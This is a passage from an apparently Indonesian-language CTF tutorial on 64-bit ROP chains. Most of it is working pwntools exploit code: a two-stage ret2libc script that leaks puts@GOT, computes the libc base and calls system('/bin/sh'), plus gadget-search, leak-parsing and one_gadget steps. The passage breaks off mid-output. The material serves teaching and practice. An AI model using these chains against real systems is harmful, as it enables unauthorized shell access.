# Build ROP object
rop = ROP(elf)

# Find pop rdi ; ret
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]

# Find ret
RET = rop.find_gadget(["ret"])[0]

# Get main address
MAIN = elf.sym["main"]

# =========================
# START
# =========================

# Start process or remote connection
if LOCAL:
    p = process(elf.path)
else:
    p = remote(HOST, PORT)

# =========================
# STAGE 1 — LEAK
# =========================

# Build leak chain
chain1 = flat(
    # Padding
    b"A" * OFFSET,

    # Control RDI
    p64(POP_RDI),

    # RDI = puts GOT
    p64(elf.got["puts"]),

    # Call puts
    p64(elf.plt["puts"]),

    # Return to main
    p64(MAIN)
)

# Send stage 1
p.sendline(chain1)

# Receive leak
leaked = p.recvline().strip()

# Print raw leak
log.info(f"RAW LEAK = {leaked!r}")

# Pad to 8 bytes
leaked = leaked.ljust(8, b"\x00")

# Convert to integer
puts_leak = u64(leaked)

# Print leak
log.info(f"puts @ {hex(puts_leak)}")

# =========================
# LIBC BASE
# =========================

# Calculate libc base
libc_base = puts_leak - libc.sym["puts"]

# Verify alignment
assert libc_base & 0xfff == 0

# Set libc base
libc.address = libc_base

# Print libc base
log.info(f"libc base @ {hex(libc_base)}")

# =========================
# TARGET ADDRESSES
# =========================

# Runtime system
SYSTEM = libc.sym["system"]

# Runtime /bin/sh
BINSH = next(libc.search(b"/bin/sh\x00"))

# Print targets
log.info(f"SYSTEM = {hex(SYSTEM)}")
log.info(f"BINSH  = {hex(BINSH)}")

# =========================
# STAGE 2 — EXPLOIT
# =========================

# Build final chain
chain2 = flat(
    # Padding
    b"A" * OFFSET,

    # Alignment if needed
    p64(RET),

    # Set RDI
    p64(POP_RDI),

    # RDI = "/bin/sh"
    p64(BINSH),

    # system("/bin/sh")
    p64(SYSTEM)
)

# Send final payload
p.sendline(chain2)

# Interactive shell
p.interactive()
```

---

# 📐 ROP Register Cheat Sheet — AMD64

|Argument|Register|
|---|---|
|arg1|`RDI`|
|arg2|`RSI`|
|arg3|`RDX`|
|arg4|`RCX`|
|arg5|`R8`|
|arg6|`R9`|
|syscall number|`RAX`|

Core gadgets:

```text
pop rdi ; ret → arg1
pop rsi ; ret → arg2
pop rdx ; ret → arg3
pop rax ; ret → syscall number
syscall        → execute syscall
ret            → next stack entry / alignment
```

---

# 🧠 LEAK CHEATSHEET

```text
GOT[puts]
    │
    ▼
POP_RDI
    │
    ▼
puts@plt
    │
    ▼
puts runtime address
    │
    ▼
puts_addr
    │
    ▼
puts_addr - libc.sym["puts"]
    │
    ▼
libc_base
```

Then:

```python
# Set libc base
libc.address = libc_base

# Resolve system
SYSTEM = libc.sym["system"]

# Resolve /bin/sh
BINSH = next(libc.search(b"/bin/sh\x00"))
```

---

# 🏆 BAGIAN 10 — GOLDEN RULES ROP

## 🥇 Rule 1

**Jangan langsung exploit.**

```text
Leak
 ↓
Verify
 ↓
Calculate
 ↓
Verify
 ↓
Exploit
```

---

## 🥈 Rule 2

**Selalu sanity-check libc base (Page Alignment).**

```python
# Pastikan 12-bit paling bawah = 0 (Page-Aligned multiple of 4096 / 0x1000)
assert libc_base & 0xfff == 0, f"Libc base offset error: {hex(libc_base)}"

# Penjelasan:
# - 0xfff (4095) adalah 12-bit bitwise mask untuk memeriksa kelipatan page size (4096 / 0x1000).
# - Contoh valid:   0x7ffff7dc0000 → 0x7ffff7dc0000 & 0xfff = 0x000 ✓
# - Contoh invalid: 0x7ffff7dc0123 → 0x7ffff7dc0123 & 0xfff = 0x123 ✗ (Leak parser / offset salah)
```

---

## 🥉 Rule 3

**Test leak terlebih dahulu.**

Jangan langsung membuat:

```text
leak + shell
```

Pisahkan:

```text
Stage 1:
LEAK

Stage 2:
EXPLOIT
```

---

## 🧠 Rule 4

**Gunakan `libc.sym[]`, bukan hardcoded offset.**

Benar:

```python
# Mengambil offset puts dari libc
puts_offset = libc.sym["puts"]

# Mengambil system
SYSTEM = libc.sym["system"]
```

Kurang aman:

```python
# Jangan jadikan hardcoded offset sebagai metode default
SYSTEM = libc_base + 0x4c490
```

---

## 🧩 Rule 5

Pada AMD64:

```text
RDI = arg1
RSI = arg2
RDX = arg3
```

---

## ⚙️ Rule 6

**Alignment harus diperiksa, bukan dihafalkan sebagai aturan mutlak.**

`ret` sering diperlukan untuk memperbaiki alignment:

```text
ret
 ↓
pop rdi
 ↓
system
```

Tetapi kebutuhan alignment bergantung pada execution state.

---

## 🎲 Rule 7

**PIE ON → perlu binary leak.**

```text
binary leak
   ↓
PIE base
   ↓
binary gadgets
```

---

## 🔐 Rule 8

**Libc lokal harus benar-benar cocok dengan target.**

Bukan:

```text
"versinya kelihatan mirip"
```

Tetapi sedapat mungkin:

```text
same libc build / exact challenge libc
```

---

## 📡 Rule 9

`recvuntil()` berguna untuk sinkronisasi output.

Contoh:

```python
# Tunggu prompt sebelum mengirim
p.recvuntil(b"> ")
```

Tetapi jangan menganggap `recvuntil()` otomatis lebih baik untuk **semua** leak. Pilih parser berdasarkan framing protocol target.

---

## 🐛 Rule 10

**Raw bytes adalah sumber kebenaran debugging.**

Selalu gunakan:

```python
# Menampilkan representasi bytes mentah
log.info(f"{data!r}")
```

---

## 🧠 Rule 11

**Satu leak yang benar lebih berguna daripada sepuluh address tebakan.**

Jangan menebak:

```text
system
/bin/sh
libc base
```

Gunakan:

```text
known leak
   ↓
known offset
   ↓
calculated address
```

---

## 🧱 Rule 12

**ROP bukan magic.**

Setiap chain harus dapat dibaca sebagai:

```text
RIP
 ↓
Gadget
 ↓
Stack value
 ↓
Register
 ↓
Function
```

Jika tidak dapat menjelaskan setiap item dalam chain, jangan menganggap chain sudah benar.

---

# 🔗 BAGIAN 11 — CROSS-WORKFLOW

## ← File 49 — Buffer Overflow

```text
./[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow)
```

**Hubungan:**

```text
File 49
   │
   ├── offset
   ├── RIP control
   ├── ret2win
   └── ret2libc dasar
          │
          ▼
      File 50
          │
          └── ROP + ASLR leak
```

File 49 adalah prerequisite utama.

---

## ← File 48 — Binary Analysis

```text
./[🔬 48 — Binary Analysis Workflow](/docs/binary-analysis)
```

Diperlukan untuk:

```text
checksec
GOT
PLT
symbols
functions
gadgets
calling convention
```

---

## → File 51 — Reverse Engineering

```text
./[🧭 BAGIAN 0: FONDASI REVERSE ENGINEERING](/docs/reverse-engineering)
```

Berguna ketika:

```text
binary stripped
   ↓
symbol hilang
   ↓
perlu mencari function/gadget secara manual
```

---

## → File 52 — CTF Binary Patterns

```text
./[🧩 File 52 — CTF Binary Patterns](/docs/ctf-binary-patterns)
```

Untuk menggabungkan pattern:

```text
BOF
+
ROP
+
Leak
+
ret2libc
+
PIE
+
Canary
+
format string
```

menjadi pattern-recognition yang lebih cepat saat mengerjakan CTF.

---

# 🧠 FINAL MENTAL MODEL

Jangan mengingat ROP sebagai daftar command.

Ingat urutan berpikir:

```text
┌──────────────────────┐
│ 1. Apakah RIP dapat  │
│    dikontrol?        │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 2. NX ON?             │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 3. Ada win()?         │
└──────────┬───────────┘
           │
          NO
           │
           ▼
┌──────────────────────┐
│ 4. ASLR ON?           │
└──────────┬───────────┘
           │
          YES
           │
           ▼
┌──────────────────────┐
│ 5. Perlu leak         │
│    address             │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 6. Ada puts/printf?   │
└──────────┬───────────┘
           │
          YES
           │
           ▼
┌──────────────────────┐
│ 7. Leak GOT pointer   │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 8. Calculate libc     │
│    base                │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 9. Resolve system +  │
│    /bin/sh             │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 10. Build final ROP   │
└──────────┬───────────┘
           │
           ▼
        SHELL
```

---

# 🧠 ONE-LINE MEMORY

```text
BOF memberi kontrol RIP → ROP menyusun gadget → leak memberi tahu libc base → offset memberi tahu system → ROP kedua menghasilkan shell.
```

---

# 🎯 ROP PATTERN TERPENTING

## Pattern 1 — `pop rdi`

```text
POP_RDI
   ↓
ARG1
   ↓
FUNCTION
```

---

## Pattern 2 — Leak

```text
POP_RDI
   ↓
GOT[FUNCTION]
   ↓
FUNCTION@PLT
   ↓
MAIN
```

---

## Pattern 3 — Calculate

```text
LEAKED_FUNCTION
      -
libc.sym["FUNCTION"]
      =
LIBC_BASE
```

---

## Pattern 4 — ret2libc

```text
RET
 ↓
POP_RDI
 ↓
BINSH
 ↓
SYSTEM
```

---

## Pattern 5 — PIE

```text
binary leak
    ↓
PIE base
    ↓
binary gadget runtime
```

---

## Pattern 6 — No `pop rdi`

```text
No pop rdi
     ↓
ret2csu / alternative gadgets
     ↓
control required registers
```

---

# ✅ FINAL ROP CHECKLIST

```text
[ ] Saya memahami mengapa ROP diperlukan
[ ] Saya memahami apa itu gadget
[ ] Saya memahami fungsi ret
[ ] Saya memahami GOT
[ ] Saya memahami PLT
[ ] Saya memahami hubungan GOT ↔ PLT
[ ] Saya memahami ASLR
[ ] Saya memahami base + offset
[ ] Saya bisa mencari pop rdi
[ ] Saya bisa mencari ret
[ ] Saya bisa mencari POP/RSI/RDX bila diperlukan
[ ] Saya memahami GOT leak
[ ] Saya memahami puts(GOT[puts])
[ ] Saya bisa membuat Stage 1
[ ] Saya memahami kenapa kembali ke main
[ ] Saya memahami Stage 2
[ ] Saya memahami recv()
[ ] Saya memahami recvline()
[ ] Saya memahami recvuntil()
[ ] Saya memahami recvn()
[ ] Saya memahami u64()
[ ] Saya memahami ljust(8, b"\x00")
[ ] Saya bisa menghitung libc base
[ ] Saya bisa melakukan alignment sanity check
[ ] Saya tidak hardcode libc offset sebagai default
[ ] Saya memahami libc mismatch
[ ] Saya memahami remote vs local libc
[ ] Saya memahami one_gadget
[ ] Saya memahami one_gadget constraints
[ ] Saya memahami ret2csu concept
[ ] Saya bisa debug leak dengan GDB
[ ] Saya bisa membaca ROP chain dari stack
[ ] Saya bisa membuat exploit two-stage
```

---

# 🏁 FINAL WORKFLOW — MUSCLE MEMORY

```text
RECON
  ↓
checksec
  ↓
BOF
  ↓
OFFSET
  ↓
RIP CONTROL
  ↓
NX?
  ↓
No win?
  ↓
ASLR?
  ↓
Need leak
  ↓
Find puts/printf
  ↓
Find GOT
  ↓
Find PLT
  ↓
Find POP_RDI
  ↓
STAGE 1
  ↓
LEAK
  ↓
PARSE
  ↓
u64()
  ↓
LIBC BASE
  ↓
VERIFY 0x1000 ALIGNMENT
  ↓
Set libc.address
  ↓
Find SYSTEM
  ↓
Find BINSH
  ↓
Check alignment
  ↓
STAGE 2
  ↓
RET
  ↓
POP_RDI
  ↓
BINSH
  ↓
SYSTEM
  ↓
INTERACTIVE
  ↓
SHELL
```

> **Tujuan akhir File 50 bukan sekadar bisa copy-paste script ROP.**
> 
> Tujuan sebenarnya adalah ketika melihat:
> 
> ```text
> NX ON
> ASLR ON
> No PIE / PIE
> No win()
> ```
> 
> otak langsung mengenali:
> 
> ```text
> "Saya butuh control RIP → leak → calculate base → second-stage ROP."
> ```
> 
> Itulah muscle memory yang harus dibangun dari workflow ini.

---

# [🔗 50 — ROP Chain Workflow](/docs/rop-chain) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Prerequisites:** File `[🔬 48 — Binary Analysis Workflow](/docs/binary-analysis)` dan `[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow)` sudah selesai — kamu sudah bisa kontrol RIP/EIP, sudah tahu offset, dan paham bahwa target tidak punya `win()` atau ASLR menghalangi hardcode address.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export BINARY="./vuln"
export LIBC_PATH="/lib/x86_64-linux-gnu/libc.so.6"  # Sesuaikan!
export TARGET_HOST=""    # Isi jika remote CTF
export TARGET_PORT=""    # Isi jika remote CTF
mkdir -p ~/rop_work/{scripts,dumps,loot}
cd ~/rop_work

# Verifikasi semua tools tersedia
python3 -c "from pwn import *; rop = ROP(ELF('$BINARY', checksec=False)); print('[OK] pwntools ROP')"
ROPgadget --version 2>/dev/null && echo "[OK] ROPgadget"
one_gadget --version 2>/dev/null && echo "[OK] one_gadget" || echo "[!] one_gadget: gem install one_gadget"
```

**Output yang diharapkan:**

text

```
[OK] pwntools ROP
ROPgadget 7.x
[OK] one_gadget
```

---

## ═══════════════════════════════════════

## FASE 0: TRIAGE — KENAPA ROP DIPERLUKAN?

## ═══════════════════════════════════════

### Langkah 0.1 — Baca checksec dan Tentukan Strategi

Bash

```
# Command 1: Checksec lengkap
checksec --file=$BINARY

# Command 2: Alternatif via pwntools
python3 -c "from pwn import *; ELF('$BINARY').checksec()"

# Command 3: Lihat library dependencies
ldd $BINARY

# Command 4: Lihat fungsi yang tersedia
python3 -c "
from pwn import *
elf = ELF('$BINARY', checksec=False)
print('PLT:', list(elf.plt.keys()))
print('Symbols:', [k for k in elf.sym.keys() if not k.startswith('_')])
"
```

**OUTPUT BERHASIL ✅ — Scenario A (ROP klasik — paling umum di CTF):**

text

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    Stripped: No
```

text

```
PLT: ['puts', 'gets', 'printf']
```

**Analisis dan tindakan:**

|Kondisi|Artinya|Strategi|
|---|---|---|
|NX enabled|Stack tidak executable|Harus ROP/ret2libc|
|No canary|Bisa overflow langsung|Langsung ke RIP control|
|No PIE|Binary address stabil|Pakai gadget dari binary langsung|
|Ada `puts@plt` + `puts@got`|Bisa leak libc|**→ 2-Stage ROP Leak**|
|Tidak ada `win()`|Tidak ada shortcut|Harus ret2libc via libc leak|

➡️ Ini adalah **Scenario A — ret2libc + ASLR**. Lanjut ke **Fase 1.**

**OUTPUT BERHASIL ✅ — Scenario B (PIE enabled):**

text

```
    NX:       NX enabled
    PIE:      PIE enabled
```

➡️ Binary base juga random. Butuh **binary leak** dulu untuk dapat PIE base, BARU libc leak. Lihat **Fase 5.**

**OUTPUT BERHASIL ✅ — Scenario C (Canary enabled):**

text

```
    Stack:    Canary found
    NX:       NX enabled
```

➡️ Butuh canary bypass dulu. Lihat `[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow)` Fase 6, baru kembali ke sini.

**OUTPUT BERBEDA 🟡 — Ada `win()` atau `system()` di PLT:**

text

```
Symbols: ['win', 'main', 'vuln']
# atau
PLT: ['puts', 'system', 'gets']
```

➡️ **STOP!** Tidak perlu ROP kompleks. Kembali ke `[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow)` Fase 4A (ret2win) atau Fase 4B (ret2libc simple). File ini untuk kasus yang lebih sulit.

---

### Langkah 0.2 — Verifikasi Offset (dari File 49)

Bash

```
# Konfirmasi offset yang sudah didapat dari File 49
export OFFSET=72  # Ganti dengan offset yang kamu temukan

# Verify RIP control dengan 'B' test
python3 -c "
from pwn import *
payload = b'A' * $OFFSET + b'B' * 8
sys.stdout.buffer.write(payload)
" | ./$BINARY
```

**OUTPUT BERHASIL ✅ — Di GDB:**

text

```
rip    0x4242424242424242    0x4242424242424242
```

➡️ RIP control terkonfirmasi. Offset = $OFFSET. Lanjut ke **Fase 1.**

**OUTPUT GAGAL ❌ — RIP tidak berisi 0x42...:**

text

```
# Segfault tapi RIP tidak 0x4242...
```

➡️ Offset salah. Kembali ke `[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow)` Langkah 2.2 untuk re-cari offset.

---

## ═══════════════════════════════════════

## FASE 1: GADGET DISCOVERY

## ═══════════════════════════════════════

> **Tujuan:** Temukan semua gadget yang diperlukan untuk membangun ROP chain.

### Langkah 1.1 — Cari Gadget Kritis

Bash

```
# Command 1: Cari pop rdi ; ret (PALING PENTING — untuk set arg1)
ROPgadget --binary $BINARY | grep "pop rdi"

# Command 2: Cari pop rsi ; ret (untuk arg2 jika perlu)
ROPgadget --binary $BINARY | grep "pop rsi"

# Command 3: Cari ret (untuk alignment)
ROPgadget --binary $BINARY | grep ": ret$"

# Command 4: Alternatif dengan pwntools (lebih cepat)
python3 -c "
from pwn import *
elf = ELF('$BINARY', checksec=False)
rop = ROP(elf)

try:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    print(f'pop rdi ; ret  @ {hex(pop_rdi)}')
except:
    print('[-] pop rdi NOT FOUND')

try:
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    print(f'pop rsi ; ret  @ {hex(pop_rsi)}')
except:
    print('[-] pop rsi NOT FOUND')

ret = rop.find_gadget(['ret'])[0]
print(f'ret            @ {hex(ret)}')
print(f'main           @ {hex(elf.sym[\"main\"])}')
print(f'puts@plt       @ {hex(elf.plt[\"puts\"])}')
print(f'puts@got       @ {hex(elf.got[\"puts\"])}')
"
```

**OUTPUT BERHASIL ✅ — Semua gadget ditemukan:**

text

```
pop rdi ; ret  @ 0x4011ab
pop rsi ; ret  @ 0x4011a9    ← opsional
ret            @ 0x40101a
main           @ 0x401176
puts@plt       @ 0x401030
puts@got       @ 0x404018
```

➡️ **SIMPAN SEMUA INI:**

Bash

```
export POP_RDI=0x4011ab
export RET=0x40101a
export MAIN=0x401176
export PUTS_PLT=0x401030
export PUTS_GOT=0x404018
echo "Gadgets saved!"
```

**OUTPUT GAGAL ❌ — pop rdi TIDAK DITEMUKAN:**

text

```
[-] pop rdi NOT FOUND
```

➡️ Binary tidak punya gadget ini secara langsung. Ada dua opsi:

Bash

```
# Opsi 1: Cari di libc (jika libc base sudah diketahui/fixed)
ROPgadget --binary $LIBC_PATH | grep "pop rdi ; ret"

# Opsi 2: Cari gadget serupa yang bisa dipakai
ROPgadget --binary $BINARY | grep "pop rdi"
# Mungkin ada: "pop rdi ; pop rbp ; ret" → masih bisa dipakai, tambah dummy value

# Opsi 3: Cek apakah ada __libc_csu_init (ret2csu)
nm $BINARY | grep "__libc_csu_init"
readelf -Ws $BINARY | grep "csu"
# Jika ada → ke Fase 6 (ret2csu)
```

**OUTPUT GAGAL ❌ — puts tidak ada di PLT:**

text

```
# Tidak ada puts@plt atau puts@got
```

➡️ Cari fungsi output lain:

Bash

```
python3 -c "
from pwn import *
elf = ELF('$BINARY', checksec=False)
# Cari semua fungsi yang bisa jadi leak primitive
for func in ['puts', 'printf', 'write', 'send', 'fwrite']:
    if func in elf.plt:
        print(f'[+] {func}@plt = {hex(elf.plt[func])}')
        print(f'[+] {func}@got = {hex(elf.got[func])}')
"
```

---

### Langkah 1.2 — Verifikasi GOT vs PLT (Penting!)

Bash

```
# Pastikan kamu paham perbedaan GOT dan PLT
python3 -c "
from pwn import *
elf = ELF('$BINARY', checksec=False)

print('=== PEMAHAMAN GOT vs PLT ===')
print(f'puts@PLT = {hex(elf.plt[\"puts\"])} ← Ini yang kita CALL')
print(f'puts@GOT = {hex(elf.got[\"puts\"])} ← Ini yang berisi runtime address')
print()
print('Konsep:')
print('  puts@PLT → dipanggil ketika kita ingin print sesuatu')
print('  puts@GOT → berisi alamat puts() di libc (yang berubah karena ASLR)')
print()
print('Untuk leak: RDI = puts@GOT, lalu CALL puts@PLT')
print('puts(puts@GOT) → akan print runtime address puts di libc')
"
```

**Output yang diharapkan:**

text

```
=== PEMAHAMAN GOT vs PLT ===
puts@PLT = 0x401030 ← Ini yang kita CALL
puts@GOT = 0x404018 ← Ini yang berisi runtime address
```

---

## ═══════════════════════════════════════

## FASE 2: BUILD STAGE 1 — LEAK ROP CHAIN

## ═══════════════════════════════════════

> **Tujuan:** Buat payload yang akan memanggil `puts(puts@GOT)` untuk leak runtime address puts di libc, lalu kembali ke `main()` untuk stage 2.

### Langkah 2.1 — Bangun dan Uji Stage 1

Python

```
#!/usr/bin/env python3
# ~/rop_work/scripts/stage1_leak.py
# STEP 1 DULU: Hanya test apakah leak berjalan, belum parse apapun
from pwn import *

BINARY = "./vuln"
OFFSET = 72  # Ganti!

elf = ELF(BINARY, checksec=False)
context.binary = elf
context.log_level = "debug"  # DEBUG dulu untuk lihat semua output

rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]
MAIN = elf.sym["main"]

log.info(f"POP_RDI = {hex(POP_RDI)}")
log.info(f"puts@GOT = {hex(elf.got['puts'])}")
log.info(f"puts@PLT = {hex(elf.plt['puts'])}")

# Build Stage 1 chain
chain1 = flat(
    b"A" * OFFSET,          # Padding sampai saved RIP
    p64(POP_RDI),           # Gadget: pop rdi ; ret
    p64(elf.got["puts"]),   # Value untuk RDI = puts@GOT
    p64(elf.plt["puts"]),   # Call puts(puts@GOT) → print leaked address
    p64(MAIN)               # Return ke main() untuk stage 2
)

log.info(f"Payload size: {len(chain1)} bytes")
log.info(f"Chain: A*{OFFSET} | POP_RDI | puts@GOT | puts@PLT | main")

p = process(elf.path)

# Jika ada prompt, uncomment dan sesuaikan:
# p.recvuntil(b"Enter: ")

p.sendline(chain1)

# Baca SEMUA output untuk debugging
import time
time.sleep(0.5)
output = p.recv(timeout=2)
log.info(f"RAW OUTPUT: {output!r}")

p.close()
```

Bash

```
python3 ~/rop_work/scripts/stage1_leak.py
```

**OUTPUT BERHASIL ✅ — Ada bytes non-ASCII di output:**

text

```
[DEBUG] Received 0x7 bytes:
    b'\x80\xa9\xe5\xf7\xff\x7f\n'
[*] RAW OUTPUT: b'\x80\xa9\xe5\xf7\xff\x7f\n'
```

➡️ Leak terdeteksi! `\x80\xa9\xe5\xf7\xff\x7f` adalah 6 byte little-endian address puts di libc. Lanjut ke **Langkah 2.2.**

**OUTPUT GAGAL ❌ — Output hanya teks atau kosong:**

text

```
[*] RAW OUTPUT: b'Welcome!\nEnter your name: '
# atau
[*] RAW OUTPUT: b''
```

➡️ Chain tidak mencapai puts atau output tertimpa prompt. Debug:

Python

```
# Tambahkan di script: handle prompt dulu
p.recvuntil(b"Enter your name: ")
p.sendline(chain1)
output = p.recvall(timeout=2)
```

**OUTPUT GAGAL ❌ — Process crash tanpa output yang benar:**

text

```
[!] Process './vuln' stopped with exit code -11 (SIGSEGV)
```

➡️ Chain salah. Debug di GDB:

Bash

```
gdb $BINARY
# Di GDB:
run < <(python3 -c "
from pwn import *
elf = ELF('./vuln', checksec=False)
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi','ret'])[0]
chain = flat(b'A'*72, p64(POP_RDI), p64(elf.got['puts']), p64(elf.plt['puts']), p64(elf.sym['main']))
sys.stdout.buffer.write(chain)
")
# Lihat register saat crash:
info registers rip rdi rsp
x/20gx $rsp
```

**Yang dicek di GDB:**

text

```
# Pada saat masuk gadget POP_RDI:
rip = 0x4011ab   ← Harus = POP_RDI address
rdi = 0x404018   ← Harus = puts@GOT
# Pada saat memanggil puts@PLT:
rip = 0x401030   ← Harus = puts@PLT
```

---

### Langkah 2.2 — Parse Leak dengan Benar

Bash

```
# KRITIS: Lihat dulu framing output sebenarnya
# Jalankan binary dengan chain1, lalu perhatikan dengan seksama:
python3 ~/rop_work/scripts/stage1_leak.py 2>&1 | grep "RAW OUTPUT"
```

**OUTPUT CASE 1 ✅ — Leak langsung sebagai baris pertama:**

text

```
RAW OUTPUT: b'\x80\xa9\xe5\xf7\xff\x7f\n'
```

➡️ Gunakan `p.recvline().strip()`

**OUTPUT CASE 2 🟡 — Ada prompt/banner sebelum leak:**

text

```
RAW OUTPUT: b'Welcome to the challenge!\n\x80\xa9\xe5\xf7\xff\x7f\nEnter again: '
```

➡️ Gunakan `p.recvuntil(b'!\n')` dulu, lalu `p.recvline().strip()`

**OUTPUT CASE 3 🟡 — Binary echo input dulu:**

text

```
RAW OUTPUT: b'AAAA...\n\x80\xa9\xe5\xf7\xff\x7f\n'
```

➡️ Gunakan dua kali `p.recvline()` → yang pertama adalah echo, yang kedua adalah leak

**Kode parsing yang aman:**

Python

```
# Method yang paling aman: lihat raw dulu, lalu parse
leaked_raw = p.recvline().strip()  # Sesuaikan dengan case yang kamu dapat
log.info(f"RAW LEAK = {leaked_raw!r}")

# Pad ke 8 byte (karena pointer 64-bit = 8 byte, tapi sering hanya 6 byte)
leaked_padded = leaked_raw.ljust(8, b"\x00")
puts_addr = u64(leaked_padded)

log.info(f"puts runtime = {hex(puts_addr)}")

# SANITY CHECK: address libc selalu mulai 0x7f...
if puts_addr < 0x7f0000000000:
    log.error(f"INVALID LEAK: {hex(puts_addr)} — parser salah!")
    exit(1)
```

**OUTPUT BERHASIL ✅:**

text

```
[*] RAW LEAK = b'\x80\xa9\xe5\xf7\xff\x7f'
[*] puts runtime = 0x7ffff7e5a980
```

**OUTPUT GAGAL ❌ — `puts runtime = 0x0`:**

text

```
[*] puts runtime = 0x0
```

➡️ Beberapa kemungkinan:

1. **GOT address salah** → cek `elf.got["puts"]`
2. **puts belum dipanggil sebelumnya** → GOT belum terisi. Coba leak fungsi lain yang sudah pasti dipanggil (seperti `__libc_start_main`)
3. **Parser salah** → lihat raw output
4. **Chain tidak jalan** → debug di GDB

**OUTPUT GAGAL ❌ — `puts runtime = 0xa7ffff7e5a980` (ada extra byte):**

text

```
[*] puts runtime = 0xa7ffff7e5a980
```

➡️ Newline `\n` (= 0x0a) ikut masuk ke parsing. Gunakan `.strip()`:

Python

```
leaked_raw = p.recvline().strip()  # strip() hapus \n di akhir
```

---

## ═══════════════════════════════════════

## FASE 3: HITUNG LIBC BASE

## ═══════════════════════════════════════

### Langkah 3.1 — Identifikasi Libc yang Digunakan

Bash

```
# Lihat libc yang digunakan binary ini
ldd $BINARY

# Cek versi libc
strings $LIBC_PATH | grep "GNU C Library"
# atau
/lib/x86_64-linux-gnu/libc.so.6 --version
```

**OUTPUT BERHASIL ✅:**

text

```
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
```

➡️ Libc teridentifikasi. Gunakan path ini untuk semua kalkulasi.

**OUTPUT BERBEDA 🟡 — CTF remote, libc mungkin berbeda:**

text

```
# Jika CTF menyertakan libc.so.6 bersama challenge:
ls -la libc*
file libc*
strings libc* | grep "GNU C Library"
```

➡️ Gunakan libc dari CTF, bukan dari sistem lokal!

---

### Langkah 3.2 — Hitung Libc Base dan Verify

Python

```
#!/usr/bin/env python3
# Standalone script untuk test kalkulasi libc base
from pwn import *

LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"  # Sesuaikan!
libc = ELF(LIBC_PATH, checksec=False)

# Nilai puts yang di-leak (CONTOH — ganti dengan nilai aktual dari Langkah 2.2)
puts_runtime = 0x7ffff7e5a980  # Ganti ini!

# Hitung offset puts dalam libc
puts_offset = libc.sym["puts"]
print(f"puts offset dalam libc: {hex(puts_offset)}")

# Hitung libc base
libc_base = puts_runtime - puts_offset
print(f"libc base kalkulasi: {hex(libc_base)}")

# SANITY CHECK 1: Page alignment (12-bit terakhir harus 0x000)
if libc_base & 0xfff != 0:
    print(f"[!] PERINGATAN: libc base TIDAK page-aligned: {hex(libc_base)}")
    print(f"    Lower 12 bits: {hex(libc_base & 0xfff)}")
    print(f"    Ini artinya: leak salah, parser salah, atau libc berbeda!")
else:
    print(f"[+] libc base page-aligned: OK")

# SANITY CHECK 2: Base harus mulai 0x7f...
if libc_base < 0x7f0000000000:
    print(f"[!] PERINGATAN: libc base mencurigakan: {hex(libc_base)}")
else:
    print(f"[+] libc base range normal: OK")

# Hitung target addresses
libc.address = libc_base
SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh\x00"))
PUTS = libc.sym["puts"]

print(f"\nsystem() @ {hex(SYSTEM)}")
print(f"/bin/sh  @ {hex(BINSH)}")

# Verify: puts harus = puts_runtime
assert PUTS == puts_runtime, f"Verify failed: {hex(PUTS)} != {hex(puts_runtime)}"
print(f"[+] Verify puts address: PASS")
```

**OUTPUT BERHASIL ✅:**

text

```
puts offset dalam libc: 0x77980
libc base kalkulasi: 0x7ffff7dc0000
[+] libc base page-aligned: OK
[+] libc base range normal: OK

system() @ 0x7ffff7e4c490
/bin/sh  @ 0x7ffff7f95bd8
[+] Verify puts address: PASS
```

**OUTPUT GAGAL ❌ — libc base TIDAK page-aligned:**

text

```
[!] PERINGATAN: libc base TIDAK page-aligned: 0x7ffff7dc0123
    Lower 12 bits: 0x123
```

➡️ Kemungkinan penyebab:

1. **Parser leak salah** → newline atau byte extra ikut masuk
2. **Libc versi berbeda** → offset puts di libc berbeda
3. **Fungsi yang di-leak bukan puts** → cek mana yang di-leak

Bash

```
# Cek offset puts di libc yang kamu gunakan
python3 -c "from pwn import *; libc = ELF('$LIBC_PATH'); print(hex(libc.sym['puts']))"
```

**OUTPUT GAGAL ❌ — assert failed:**

text

```
AssertionError: Verify failed: 0x7ffff7e5a980 != 0x7ffff7e5b000
```

➡️ Libc yang kamu load berbeda dengan yang digunakan binary. Gunakan `ldd` untuk temukan libc yang tepat.

---

## ═══════════════════════════════════════

## FASE 4: BUILD STAGE 2 — SHELL ROP CHAIN

## ═══════════════════════════════════════

### Langkah 4.1 — Coba one_gadget Dulu (Lebih Cepat)

Bash

```
# Cari one_gadget candidates
one_gadget $LIBC_PATH

# Dengan lebih banyak kandidat
one_gadget $LIBC_PATH --level 1
```

**OUTPUT BERHASIL ✅:**

text

```
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
  r12 == NULL

